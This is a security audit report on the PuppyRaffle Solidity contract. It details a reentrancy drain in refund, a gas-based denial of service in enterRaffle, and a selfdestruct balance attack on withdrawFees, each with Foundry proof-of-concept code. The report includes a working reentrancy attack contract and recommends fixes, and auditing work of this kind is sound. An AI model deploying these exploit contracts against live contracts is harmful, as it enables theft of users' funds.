# Findings
## High Severity
### [H-1] Not fulfilling CEI pattern in `PuppyRaffle::refund` function allows Reentrancy, withdrawing balance repeatedly from `PuppyRaffle` contract.

**Severity** 
- **Impact:** High
- **Likelihood:** High

**Description**

In `PuppyRaffle::refund`, there is check-interact-effect, which does not fulfill the CEI pattern. If an attacker contract set it's own `fallback` or `receive` function to enter `refund` function, it can re-enter the `refund` because the interaction statement `payable(msg.sender).sendValue(entranceFee);` is executed before the effect statement `players[playerIndex] = address(0);`.
```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```
**Impact**: The attacker contract can re-enter the `refund` repeatedly until the balance of `PuppyRaffle` gets smaller than `PuppyRaffle::entranceFee`, and steals almost of balance.

**Proof of Concept**: The `RaffleReentrancy` contract has `fallback` and `receive` function to call `PuppyRaffle::refund`. If `RaffleReentrancy::attack` is called, you might see `RaffleReentrancy` steal all balance of `PuppyRaffle`.

<details>
<summary>code</summary>

Place the following test into `test/PuppyRaffleTest.t.sol`.
1. Add `testRefundReentrancy` into the `PuppyRaffleTest`.
```solidity
function testRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    address attacker = address(99);
    vm.deal(attacker, 10 ether);
    vm.prank(attacker);
    RaffleReentrancy attackContract = new RaffleReentrancy{
        value: entranceFee
    }(attacker, puppyRaffle, entranceFee);
    uint balanceAttackContractBefore = address(attackContract).balance;
    uint balanceRaffleBefore = address(puppyRaffle).balance;
    attackContract.attack();
    uint balanceAttackContractAfter = address(attackContract).balance;
    uint balanceRaffleAfter = address(puppyRaffle).balance;
    console.log(
        "balance of AttackContract before: %s, after: %s",
        balanceAttackContractBefore,
        balanceAttackContractAfter
    );
    console.log(
        "balance of Raffle before: %s, after: %s",
        balanceRaffleBefore,
        balanceRaffleAfter
    );
}
```
1. Add `RaffleReentrancy` outside.
```solidity
contract RaffleReentrancy {
    address owner;
    PuppyRaffle public raffle;
    uint public entranceFee;
    uint public index;

    constructor(
        address _owner,
        PuppyRaffle _raffle,
        uint _entranceFee
    ) payable {
        owner = _owner;
        raffle = _raffle;
        entranceFee = _entranceFee;
        index = 0;
    }

    function attack() public {
        address ownAddr = address(this);
        address[] memory player = new address[](1);
        player[0] = ownAddr;
        raffle.enterRaffle{value: entranceFee}(player);
        index = raffle.getActivePlayerIndex(ownAddr);
        raffle.refund(index);
    }

    function _callRefund() private {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(index);
        }
    }

    function withdraw(uint amount) public {
        require(msg.sender == owner);
        payable(owner).transfer(amount);
    }

    fallback() external payable {
        _callRefund();
    }

    receive() external payable {
        _callRefund();
    }
}
```
</details>

**Recommendation**:
1. Use CEI pattern. Move Interacting statements below the Effecting statements.
   ```diff
   -payable(msg.sender).sendValue(entranceFee);
   players[playerIndex] = address(0);
   +payable(msg.sender).sendValue(entranceFee);
   ```

2. Use a boolean lock variable, which is set to be `true` in entering, to be `false` in the end of `refund`.
3. Use `ReentrancyGuard` by Openzeppelin.

## Medium Severity
### [M-1] Unbounded for-loop checking duplicates in `PuppyRaffle::enterRaffle` is a potential DoS attack, incrementing gas costs for future entrants

**Severity**: 
- Impact: Medium
- Likelihood: Medium
 
**Description**:
In `PuppyRaffle::enterRaffle`, there is a nested for-loop with O(n^2) time-complexity to check duplicates in users entered raffle.
```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(
            players[i] != players[j],
            "PuppyRaffle: Duplicate player"
        );
    }
}
```
However, because the `enterRaffle` is just a payable function without constraints like ACLs, users can call it without any risk. 
```solidity
function enterRaffle(address[] memory newPlayers) public payable { 
    ...
}
```
So, the `players` array can be easily extended, the for-loop can be unbounded.

**Impact**:
This can cause **Denial-of-Service(DoS)** attack. If malicious users call `enterRaffle` with large `newPlayers` or call `enterRaffle` repeatedly, gas cost to run new `enterRaffle` become gradually expensive. Then new late users have to pay more gas to enter, or even cannot enter the raffle and malicious users will get all rewards.

**Proof of Concept**:
The first `enterRaffle` call pushs 1000 addresses, which cost `440181896` gas. However, the second call pushs only one address, it costs `417774202` gas, which is even more than first call. That gas amount is really huge amount itself, the worst is the more calls accumulated, the more gas needed, end with `revert`.
<details>
<summary><b>code</b></summary>

Place the following test into `test/PuppyRaffleTest.t.sol`.
```solidity
function testEnterRaffleDoS() public {
    uint gasBefore;
    uint gasAfter;
    address[] memory newOnePlayer = new address[](1);
    
    // 1. Entering only one new user
    newOnePlayer[0] = address(99999);
    gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee}(newOnePlayer);
    gasAfter = gasleft();
    console.log("1. Gas used:", gasBefore - gasAfter);

     // 2. Entering 1000 new users
    uint numberOfPlayers = 1000;
    address[] memory players = new address[](numberOfPlayers);
    for (uint i = 0; i < numberOfPlayers; i++) {
        players[i] = address(i);
    }
    gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numberOfPlayers}(players);
    gasAfter = gasleft();
    console.log("2. Gas used:", gasBefore - gasAfter);

     // 3. Entering only one new user
    newOnePlayer[0] = address(9999);
    gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee}(newOnePlayer);
    gasAfter = gasleft();
    console.log("3. Gas used:", gasBefore - gasAfter);
}
```
Run test via `forge test --match-test testEnterRaffleDoS -vv`, then you can see the expected output:
```bash
Logs:
  1. Gas used: 61582
  2. Gas used: 440987844
  3. Gas used: 418609328
```

</details>


**Recommnedation**:
1. Consider allowing duplicates. Users can make new wallet address anyways, so duplicates check does not prevent the same person from entering multiple times, only the same wallet address.
2. Use **mappings** to remove unbouded for-loop checking duplicates, which cost only O(1) time-complexity.
    - State variable change: 
        ```solidity
        mapping(address => bool) public s_hasEntered;
        address[] public players; // Still need this for iteration if players need to be listed
        ```
    - Function logic change:
        ```solidity
        function enterRaffle(address[] memory newPlayers) public payable {
            // ... (pre-checks for entranceFee, etc.)
            for (uint256 i = 0; i < newPlayers.length; i++) {
                address player = newPlayers[i];
                require(!s_hasEntered[player], "PuppyRaffle: Duplicate player");
                s_hasEntered[player] = true;
                players.push(player); // Only add to players if not duplicate
            }
        }
        ```

3. If any additional for-loop traversal in `players` is needed, consider to make limitations of users in one raffle round and check before pushing new user.
    - Variable change:
        ```solidity
            uint maxPlayersInRound;
        ```
    - Function logic change:
        ```solidity
        function enterRaffle(address[] memory newPlayers) public payable {
            // ... (pre-checks for entranceFee, etc.)
            for (uint256 i = 0; i < newPlayers.length; i++) {
                // ... (checks for duplication, etc.)
                require(players.length <= maxPlayersInRound, "PuppyRaffle: max players in round")
                s_hasEntered[player] = true;
                players.push(player);
            }
        }
        ```

4. Use EnumerableSet in OpenZeppelin. Follow [link](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).

### [M-2] Mishandling ETH in `PuppyRaffle::withdrawFees` function might block withdrawal of fees.

#### Severity
- **Impact**: Medium
- **Likelihood**: Medium

#### Description 
In `PuppyRaffle::withdrawFees`, there is a `require(address(this).balance == uint256(totalFees))` statement for checking whether raffle is done, so that there are no active users in current. But comparing the contract balance with internal sum variable might be an attack vector, which can be maliciously added by `SELFDESTRUCT` call in another contract. (Note that the operation of `SELFDESTRUCT` has been changed recently, please check it.)

#### Impact
Due to the modified balance of `PuppyRaffle` does not match with `PuppyRaffle::totalFees`, the `require` statement fails, then `PuppyRaffle::feeAddress` account cannot withdraw fee normally. There maybe some solutions like account might call other `SELFDESTRUCT` contract to adjust the balance, but these are not the correct intention of the protocol.

#### Proof of Concept:
After 4 players entered raffle and winner has been selected, an attacker inits the contract with ETH. Then call `RaffleSelfDestruct::attack` function including `selfdestruct`, which pushs remaining ETH to the `PuppyRaffle`. As a result, `PuppyRaffle::withdrawFees` reverts with regarding the raffle is not done.

<details>
<summary>code</summary>

```solidity
function testRaffleSelfDestruct() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    puppyRaffle.selectWinner();
    RaffleSelfDestruct selfDestruct = new RaffleSelfDestruct{
        value: 1 ether
    }(address(puppyRaffle));

    selfDestruct.attack();
    console.log(
        "balance of PuppyRaffle: %s, totalFees: %s",
        address(puppyRaffle).balance,
        uint(puppyRaffle.totalFees())
    );
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```
</details>

#### Recommended Mitigation 
Modify the logic to check whether the raffle is done, removing the statement to comparing with the balance of `PuppyRaffle`.
- Check `players.length` in `withdrawFees`, revert if is not 0.
- Make a bool flag variable like `raffleOngoing`, set `true` in `enterRaffle` and `false` in `selectWinner`. Revert if the flag is true.
